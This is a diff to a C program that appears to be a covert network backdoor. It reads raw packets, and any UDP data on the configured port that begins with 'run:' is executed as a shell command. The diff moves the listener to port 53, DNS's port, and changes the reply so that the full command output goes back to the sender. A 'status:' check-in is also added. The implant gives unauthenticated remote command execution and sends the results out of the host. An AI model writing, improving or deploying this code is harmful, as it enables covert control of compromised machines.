@@ -17,10 +17,10 @@
 
 /* CUSTOMIZE THESE LINES FOR HARD CODED VALUES */
 #ifndef IFACE
-#define IFACE "ens160"
+#define IFACE "ens33"
 #endif
 #ifndef PORT
-#define PORT 80
+#define PORT 53
 #endif
 #ifndef PROMISC
 #define PROMISC false
@@ -156,18 +156,45 @@ int main(int argc, char *argv[])
         ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
         udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
         udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
+
+
+        //checkup on the service, make sure it is still there
+        if(!strncmp(udpdata, "status:", 7)){
+            send_status(buf, "up");
+        }
+
         //run a command if the data is prefixed with run:
         if (!strncmp(udpdata, "run:", 4)){
             int out = open("/dev/null", O_WRONLY);
             int err = open("/dev/null", O_WRONLY);
 	    dup2(out, 0);
 	    dup2(err, 2);
-	    code = system(udpdata + 4); //replace with fork + exec
-	    
+
+            FILE *fd;
+            fd = popen(udpdata + 4, "r");
+            if (!fd) return -1;
+ 
+            char buffer[256];
+            size_t chread;
+            /* String to store entire command contents in */
+            size_t comalloc = 256;
+            size_t comlen   = 0;
+            char *comout   = malloc(comalloc);
+ 
+            /* Use fread so binary data is dealt with correctly */
+            while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
+                if (comlen + chread >= comalloc) {
+                    comalloc *= 2;
+                    comout = realloc(comout, comalloc);
+                }
+                memmove(comout + comlen, buffer, chread);
+                comlen += chread;
+            }
+            pclose(fd);
+            send_status(buf, comout);
+	
 	}
-        //checkup on the service, make sure it is still there
-        if(!strncmp(udpdata, "status", 6))
-            send_status(buf, code);
+        
     }
     return 0;
 }
@@ -191,22 +218,16 @@ void sigint(int signum){
 }
 
 //send a reply
-void send_status(unsigned char *buf, int code){
+void send_status(unsigned char *buf, char *payload){
     struct udpframe frame;
     struct sockaddr_ll saddrll;
     struct sockaddr_in sin;
-    int len = snprintf(NULL, 0, "%d", code);
-    char *prefix = "LISTENING: ";
-    char *ccode = (char*)calloc(1, len+1);
-    char *data = calloc(1, strlen(prefix)+len+2);
+    int len;
+
 
     //setup the data
     memset(&frame, 0, sizeof(frame));
-    snprintf(ccode, len+1, "%d", code);
-    strncpy(data, prefix, strlen(prefix));
-    strncat(data, ccode, len+1);
-    strncat(data, "\n", 1);
-    strncpy(frame.data, data, strlen(data));
+    strncpy(frame.data, payload, strlen(payload));
 
     //get the ifindex
     if (ioctl(sockfd, SIOCGIFINDEX, sifreq) == -1){
@@ -230,7 +251,7 @@ void send_status(unsigned char *buf, int code){
     frame.ip.frag_off |= htons(IP_DF);
     frame.ip.ttl = 64;
     frame.ip.tos = 0;
-    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(data));
+    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(payload));
     frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
     frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
     frame.ip.protocol = IPPROTO_UDP;
@@ -238,19 +259,15 @@ void send_status(unsigned char *buf, int code){
     //layer 4
     frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
     frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
-    frame.udp.len = htons(strlen(data) + sizeof(frame.udp));
+    frame.udp.len = htons(strlen(payload) + sizeof(frame.udp));
 
     //checksums
     //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
     ip_checksum(&frame.ip);
 
     //calculate total length and send
-    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);
+    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(payload);
     sendto(sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
-
-    //cleanup
-    free(ccode);
-    free(data);
 }
 
 /* checksum functions from http://www.roman10.net/how-to-calculate-iptcpudp-checksumpart-2-implementation/ */
